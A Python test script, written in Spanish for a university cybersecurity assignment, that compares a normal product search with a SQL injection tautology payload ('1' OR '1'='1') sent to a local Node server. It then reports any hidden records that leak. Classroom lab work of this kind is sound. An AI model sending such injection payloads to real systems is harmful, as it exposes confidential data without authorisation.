#!/usr/bin/env python3
# ====================================================================
# Script de Prueba: PR-SQL-01 / Explotación de Validación Deficiente
# Materia: Ciberseguridad - Actividad 3 (TechLoop)
# ====================================================================

import requests
import json
import time

URL_BASE = "http://localhost:3000/api/productos/buscar"

def encabezado(texto):
    print("\n" + "=" * 70)
    print(f" {texto}")
    print("=" * 70)

def prueba_busqueda_legitima():
    encabezado("1. PETICIÓN LEGÍTIMA: Búsqueda de 'iPhone'")
    parametros_legitimos = {"busqueda": "iPhone 13 Pro Max"}
    
    try:
      inicio = time.time()
      respuesta = requests.get(URL_BASE, params=parametros_legitimos)
      latencia = round((time.time() - inicio) * 1000, 2)

      print(f"URL consultada: {respuesta.url}")
      print(f"Código HTTP recibido: {respuesta.status_code}")
      print(f"Tiempo de respuesta: {latencia} ms")
      
      datos = respuesta.json()
      print(f"Total de productos devueltos: {datos.get('total_resultados')}")
      print("\nProductos recibidos:")
      for item in datos.get("productos", []):
          print(f"  - [{item.get('id')}] {item.get('nombre')} | Precio: ${item.get('precio')} | Oculto: {item.get('oculto')}")
          
    except Exception as error:
      print(f"❌ Error al conectar con el servidor: {error}")
      print("Asegúrate de que 'node servidor.js' esté corriendo en localhost:3000.")

def prueba_inyeccion_sql():
    encabezado("2. PETICIÓN MALICIOSA: Inyección SQL (Tautología)")
    # Carga útil exacta descrita en el PDF: 1' OR '1'='1
    inyeccion_tautologia = "1' OR '1'='1"
    parametros_maliciosos = {"busqueda": inyeccion_tautologia}
    
    try:
      inicio = time.time()
      respuesta = requests.get(URL_BASE, params=parametros_maliciosos)
      latencia = round((time.time() - inicio) * 1000, 2)

      print(f"URL consultada: {respuesta.url}")
      print(f"Código HTTP recibido: {respuesta.status_code}")
      print(f"Tiempo de respuesta: {latencia} ms")
      
      datos = respuesta.json()
      productos_obtenidos = datos.get("productos", [])
      total = datos.get("total_resultados", len(productos_obtenidos))

      print(f"Consulta ejecutada en servidor: {datos.get('consulta_ejecutada')}")
      print(f"\n🚨 TOTAL DE REGISTROS EXTRAÍDOS: {total}")
      
      productos_ocultos_filtrados = []
      print("\nDesglose de productos:")
      for item in productos_obtenidos:
          es_oculto = item.get("oculto") == 1
          marca = "🔴 [OCULTO/FILTRADO]" if es_oculto else "🟢 [PÚBLICO]"
          print(f"  {marca} [{item.get('id')}] {item.get('nombre')} (${item.get('precio')})")
          if es_oculto:
              productos_ocultos_filtrados.append(item)

      print("-" * 70)
      if len(productos_ocultos_filtrados) > 0:
          print(f"✅ ¡VULNERABILIDAD DEMOSTRADA CON ÉXITO!")
          print(f"Se lograron extraer {len(productos_ocultos_filtrados)} registros ocultos confidenciales que no debían ser visibles.")
      else:
          print("⚠️ No se extrajeron registros ocultos. Verifica la configuración de la BD.")
          
    except Exception as error:
      print(f"❌ Error al conectar con el servidor: {error}")

if __name__ == "__main__":
    print("Iniciando prueba automatizada de Inyección SQL...")
    prueba_busqueda_legitima()
    prueba_inyeccion_sql()
